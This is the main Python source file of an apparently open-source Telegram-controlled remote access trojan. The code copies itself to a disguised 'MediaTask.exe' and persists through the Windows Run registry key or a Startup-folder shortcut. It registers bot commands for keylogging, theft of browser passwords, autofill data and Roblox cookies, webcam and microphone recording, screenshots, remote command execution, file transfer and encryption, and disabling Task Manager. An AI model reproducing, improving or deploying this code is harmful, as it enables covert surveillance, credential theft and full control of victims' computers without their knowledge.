##  _________________________________________
##   |_______  authors: Eks1azy  _______| 
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\                    
##  ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy   / /
##  |                                        / / 
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/



from config import API_TOKEN, ALLOWED_USER_ID, MAX_ATTEMPTS, MAX_MESSAGE_LENGTH, destination_folder, directory, file_ids

import os
import logging
import sys
import asyncio
import shutil
from pathlib import Path
import subprocess
import winreg
from aiogram import types
from aiogram.filters import Command

# ## Отключение вывода на экран
# sys.stdout = open(os.devnull, 'w')  
# sys.stderr = open(os.devnull, 'w')  
# logging.basicConfig(level=logging.CRITICAL + 1)
# logging.getLogger('aiogram').disabled = True

# ## Включаем логирование, чтобы не пропустить важные сообщения
# logging.basicConfig(level=logging.INFO)


# Объект бота
from config import bot, dp


def extract_file(resource_name, output_path):
    if not os.path.exists(output_path):
        current_dir = Path(__file__).resolve().parent
        resource_path = current_dir / resource_name

        if resource_path.exists():
            shutil.copy(resource_path, output_path)
        else:
            raise FileNotFoundError(f'Resource {resource_path} not found')


def copy_and_rename(destination_folder, new_name, icon_path=None):
    new_file_path = os.path.join(destination_folder, new_name)

    if os.path.exists(new_file_path):
        return "Файл уже существует. Копирование не требуется."

    current_file = sys.argv[0]

    try:
        shutil.copy(current_file, new_file_path)

        return f"Файл успешно скопирован в {new_file_path}"
    except Exception as e:
        return f"Ошибка при копировании: {e}"


def add_to_registry(script_path):
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                                 winreg.KEY_SET_VALUE)

        winreg.SetValueEx(reg_key, "MediaTask", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(reg_key)

        return True
    except Exception:
        return False


def add_to_startup_folder(script_path):
    try:
        startup_folder = os.path.expandvars(
            r"%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
        )

        shortcut_name = "MediaTask.lnk"
        shortcut_path = os.path.join(startup_folder, shortcut_name)

        if os.path.exists(shortcut_path):
            return

        ps_command = (
            f"$s = (New-Object -COM WScript.Shell).CreateShortcut('{shortcut_path}'); "
            f"$s.TargetPath = '{script_path}'; "
            f"$s.WorkingDirectory = '{os.path.dirname(script_path)}'; "
            f"$s.Save()"
        )

        subprocess.run(["powershell", "-Command", ps_command], capture_output=True, text=True)
    except Exception:
        pass


@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer(
    " Приветствую, root. Я готов к работе.\n\n"
    " Доступные команды:\n\n"

    " Основное управление:\n"
    "/start — Запустить бота\n"
    "/pc_data — Получить информацию о ПК\n"
    "/network_diagnostics — Диагностика сети\n"
    "/shutdown_pc — Выключить ПК\n"
    "/restart_pc — Перезагрузить ПК\n"
    "/self_destruction — Удалить бота с устройства\n\n"

    " Безопасность и защита:\n"
    "/antivirus — Проверить антивирусные программы\n"
    "/cmd_boom — Вывести ошибку CMD\n"
    "/close_task_manager — Закрыть диспетчер задач\n\n"

    " Скриншоты и запись:\n"
    "/screenshot — Сделать скриншот\n"
    "/snapshot — Фото с веб-камеры\n"
    "/web_record — Видеозапись с веб-камеры\n"
    "/audio_record — Запись звука с микрофона\n"
    "/play_sound — Проиграть звук\n\n"

    " Мониторинг:\n"
    "/key_logger — Запустить кейлоггер\n"
    "/key_logs — Получить лог клавиш\n"
    "/clipboard_content — Буфер обмена\n"
    "/chrome_history — История Chrome\n"
    "/opera_history — История Opera\n"
    "/autofill — Автозаполнения браузера\n" ## NEW
    "/passwords — Пароли браузера\n" ## NEW
    "/robloxcookie — Получить Roblox cookie\n\n"
    "/processes — Активные процессы\n"
    "/fullprocesses — Все процессы\n"
    "/terminate_process — Завершить процесс\n\n"

    " Файлы и директории:\n"
    "/cmd — открыть командную строку\n"
    "/send_file — Получить файл\n"
    "/upload_file — Загрузить файл\n"
    "/delete_file — Удалить файл\n"
    "/move_file — Переместить файл\n"
    "/create_folder — Создать папку\n"
    "/delete_folder — Удалить папку\n"
    "/show_directory_content — Список файлов\n"
    "/change_directory — Сменить директорию\n\n"

    " Удалённые действия:\n"
    "/open_url — Открыть ссылку в браузере\n"
    "/alt_f4 — Закрыть активное окно\n"
    "/minimize_all_windows — Свернуть все окна\n"
    "/change_wallpaper — Сменить обои рабочего стола\n\n"

    " Управление звуком:\n"
    "/mute_sound — Выключить звук\n"
    "/unmute_sound — Включить звук\n"
    "/set_volume_100 — Установить громкость 100%\n\n"

    " Шифрование:\n"
    "/encrypt_file — Зашифровать файл\n"
    "/decipher_file — Расшифровать файл\n"
)



    kb = [
        [ 
            types.KeyboardButton(text="Антивирус"),                     # Working good
            types.KeyboardButton(text="Скриншот"),                      # FIXED  Working good
        ],
        [
            types.KeyboardButton(text="Процесы"),                       # Working good    
            types.KeyboardButton(text="Фото с камеры")                  # Working good
        ],
        [
            types.KeyboardButton(text="Полный отчет по процесам"),      # Working good
            types.KeyboardButton(text="Завершить процесс")              # Working good
        ],
        [
            types.KeyboardButton(text="Создать папку"),                 # Working good
            types.KeyboardButton(text="Удалить папку")                  # Working good
        ],
        [
            #types.KeyboardButton(text="Содержание директории"), working bad (maybe fixed later)       
            types.KeyboardButton(text="Переместиться по директории [ Просмотр папок ]")                # Working good
        ],
        [
            types.KeyboardButton(text="Данные ПК"),                     # Working good
            types.KeyboardButton(text="Диагностика сети")               # Working good
        ],
        [
            types.KeyboardButton(text="Запись с веб камеры"),           # Working good
            types.KeyboardButton(text="Запись аудио")                   # Working good
        ],
        [
            types.KeyboardButton(text="Открыть файл"),                  # Working good
            types.KeyboardButton(text="Загрузить файл")                 # Working good
        ],
        [
            types.KeyboardButton(text="Скачать файл"),                  # Working good
            types.KeyboardButton(text="Удалить файл")                   # Working good
        ],
        [
            types.KeyboardButton(text="Зашифровать файл"),              # Working good
            types.KeyboardButton(text="Расшифровать файл")              # Working good
        ],
        [
            types.KeyboardButton(text="История хрома"),                 # Working good
            types.KeyboardButton(text="История оперы")                  # Working good
        ],
        [
            types.KeyboardButton(text="Автозаполнения браузера [new]"), # NEW  Working good
            types.KeyboardButton(text="Пароли браузера [new]")          # NEW  Working bad
        ],
        [
            types.KeyboardButton(text="Роблокс куки [new]"),            # NEW  Working good (with out Opera Gx)
            types.KeyboardButton(text="Командная строка [new]")         # NEW  Working good
        ],
        [
            types.KeyboardButton(text="ALT + F4"),                      # Working good
            types.KeyboardButton(text="Свернуть все окна")              # Working good
        ],
        [
            types.KeyboardButton(text="Посмотреть буфер обмена"),       # Working bad (fix later)
            types.KeyboardButton(text="Изменить буфер обмена")          # Working good
        ],
        [
            types.KeyboardButton(text="Закрыть диспетчер задач"),       # Working good
            types.KeyboardButton(text="Открыть ссылку")                 # Working good
        ],
        [
            types.KeyboardButton(text="Включить звук"),                 # Working good
            types.KeyboardButton(text="Выключить звук")                 # Working good
        ],
        [
            types.KeyboardButton(text="Звук на 100%"),                  # Working good
            types.KeyboardButton(text="CMD бомба")                      # Working good
        ],
        [
            types.KeyboardButton(text="Выключить ПК"),                  # Working good
            types.KeyboardButton(text="Перезагрузить ПК")               # Working good
        ],
        [
            types.KeyboardButton(text="Перемистить файл"),              # Working good
            types.KeyboardButton(text="Поменять обои")                  # Working good
        ],
        [
            types.KeyboardButton(text="key logger [new]"),              # NEW  Working good
            types.KeyboardButton(text="key logs [new]")                 # NEW  Working good
        ],
        [
            types.KeyboardButton(text="воспроизвести звук [new]"),      # NEW  Working good
            types.KeyboardButton(text="Самоуничтожение")                # Working good
        ],
    ]
    keyboard = types.ReplyKeyboardMarkup(
        keyboard=kb,
        resize_keyboard=True,

    )
    await message.answer("Готов к использованию", reply_markup=keyboard)
user_directories = {}


############################  CMD COMMAND  ################################

from lib.System.PC.cmd import register_cmd_comand

register_cmd_comand(dp)

###########################  ROBLOX COOKIE  ###############################

from lib.Credintial.roblosecurity import register_roblosecurity_handler

register_roblosecurity_handler(dp)

#########################  BROWSER PASSWORDS  #############################

from lib.Credintial.password import register_password_handler

register_password_handler(dp)

############################  BROWSER AUTOFILL  ###########################

from lib.Credintial.autofill import register_autofill_handler

register_autofill_handler(dp)

##############################  PLAY SOUND  ###############################

from lib.Access.Audio.play_sound import register_play_sound_handlers

register_play_sound_handlers(dp)

#############################  KEY LOGGER  ################################

from lib.System.Key_logger.key_logger_handlers import key_logger_handlers

key_logger_handlers(dp)

############################  KEY LOGS  ###################################

from lib.System.Key_logger.key_logs_handlers import key_logs_handlers

key_logs_handlers(dp)

################################  ANTIVIRUS  ##############################

from lib.System.Antivirus.antivirus_handlers import register_antivirus_handlers

register_antivirus_handlers(dp)

##############################  SCREENSHOT  ###############################

from lib.Access.Screenshot.screenshot_handlers import register_screenshot_handlers

register_screenshot_handlers(dp)

##############################  SNAPSHOT  #################################

from lib.Access.Webcam.Snapshot import register_snapshot_handlers

register_snapshot_handlers(dp)

###############################  PROCCESES ################################

from lib.System.Procceses.process import register_processes_handlers

register_processes_handlers(dp)

#############################  FULL PROCCESSES  ###########################

from lib.System.Procceses.fullprocesses import register_full_processes_handlers

register_full_processes_handlers(dp)

###########################  TERMINATE PROCCES ############################

from lib.System.Procceses.terminate_process import register_terminate_process_handlers

register_terminate_process_handlers(dp)

############################  CREATE FOLDER  ##############################

from lib.System.Folders.create_folder import register_create_folder

register_create_folder(dp)

############################  DELETE FOLDER  ##############################

from lib.System.Folders.delete_fodlder import register_folder_delete

register_folder_delete(dp)

###########################  DOWNLOAD FILE  ###############################

from lib.System.File.download_file import register_download_file

register_download_file(dp)

#############################  DELETE FILE  ###############################

from lib.System.File.delete_file import register_delete_file

register_delete_file(dp)

##########################  DIRECTORY VALUE  ##############################

from lib.System.More.directory_value import register_directory_value

register_directory_value(dp)

##############################  CHANGE CD  ################################

from lib.System.More.move_to_directory import register_cd

register_cd(dp)

##########################  CHROME HISTORY  ###############################

from lib.Credintial.Chrome_history import register_chrome_history_handlers

register_chrome_history_handlers(dp)

############################  RECORD WEBCAM  ##############################

from lib.Access.Webcam.Web_record import register_webcam_record_handlers

register_webcam_record_handlers(dp)

###############################  Alt F4  ##################################

from lib.System.Folders.altf4 import register_alt_f4_handlers

register_alt_f4_handlers(dp)

#############################  CLOSE ALL WINDOW  ##########################

from lib.System.Folders.closefolders import register_minimize_all_windows_handlers

register_minimize_all_windows_handlers(dp)


############################ OPEN FOLDERS #################################

from lib.System.Folders.open_folders import register_open_file_handlers

register_open_file_handlers(dp)


###############################  LOAD FILE  ###############################

from lib.System.File.load_file import register_load_file

register_load_file(dp)

#################################  AUDIO  #################################

from  lib.Access.Audio.recordmic_handlers import register_audio_handlers

register_audio_handlers(dp)

#############################  CHECK COPIED  ##############################

from lib.System.More.check_copied import register_check_copied

register_check_copied(dp)

###############################  OPEN URL  ################################

from lib.System.More.open_url import register_open_url

register_open_url(dp)

##########################  СLOSE DISPETCHER  #############################

from lib.System.More.close_dp import register_close_dp

register_close_dp(dp)

###########################  OPERA HISTORY  ###############################

from lib.Credintial.Opera_history import register_opera_history_handlers

register_opera_history_handlers(dp)

##############################  SOUND OFF  ################################

from lib.System.Sound.Sound_off import register_mute_handlers

register_mute_handlers(dp)

###############################  SOUND ON  ################################

from lib.System.Sound.Sound_on import register_sound_handlers

register_sound_handlers(dp)

###########################  SOUND ONN 100%  ##############################

from lib.System.Sound.volume_100 import register_volume_100

register_volume_100(dp)

#############################  ENSRYPT FILE  ##############################

from lib.System.Crypt.Encrypt import register_encrypt_handlers

register_encrypt_handlers(dp)

############################  DISCRYPT FILE  ##############################

from lib.System.Crypt.discrypt import register_discrypt

register_discrypt(dp)

###############################  CMD BOMB  ################################

from lib.System.PC.cmd_bomb import register_cmd_bomb

register_cmd_bomb(dp)

################################  PC DATA  ################################

from lib.System.PC.pc_data import register_pc_data

register_pc_data(dp)

################################  WIFI DATA  ##############################

from lib.System.PC.wifi_data import register_wifi_data

register_wifi_data(dp)

#############################  PC SHUTDOWN  ###############################

from lib.System.PC.pc_off import register_shutdown_handlers

register_shutdown_handlers(dp)

##############################  REBOOT PC  ################################

from lib.System.PC.pc_reboot import register_reboot_handlers

register_reboot_handlers(dp)

##########################  WALLPAPER CHANGE  #############################

from lib.System.PC.change_wallpaper import register_wallpaper_handlers

register_wallpaper_handlers(dp)

###############################  MOVE FILE  ###############################

from lib.System.Folders.move_file import register_move_file

register_move_file(dp)

#############################  SELF DESTRICTION  ##########################

from lib.System.PC.self_destruction import register_self_destruction

register_self_destruction(dp)

###########################################################################


async def main():
    destination_folder = r'C:\ProgramData\MediaTask'
    new_name = 'MediaTask.exe'
    icon_path = None  

    if not os.path.exists(destination_folder):
        os.makedirs(destination_folder)

    result = copy_and_rename(destination_folder, new_name, icon_path)
  
    await dp.start_polling(bot)


if __name__ == "__main__":
    script_path = 'C:\\ProgramData\\MediaTask\\MediaTask.exe'

    if not add_to_registry(script_path):
        add_to_startup_folder(script_path)

    asyncio.run(main())